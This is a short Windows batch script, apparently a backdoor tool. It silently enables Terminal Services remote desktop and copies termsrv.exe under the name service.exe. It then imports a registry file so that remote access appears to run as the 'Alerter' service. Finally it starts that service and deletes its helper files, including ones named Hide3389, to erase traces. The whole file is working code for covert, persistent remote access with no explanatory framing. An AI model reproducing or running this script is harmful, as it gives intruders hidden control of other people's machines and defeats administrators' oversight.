echo [Components] > c:\ts 
echo TSEnable = on >> c:\ts
sysocmgr /i:c:\winnt\inf\sysoc.inf /u:c:\ts /q /r

@echo off
@copy %SystemRoot%\System32\termsrv.exe %SystemRoot%\System32\service.exe
@regedit.exe /s Alerter.reg
@net start Alerter
@del Alerter.reg
@del StopServ.bat
@del Hide3389.bat
@del Hide3389.exe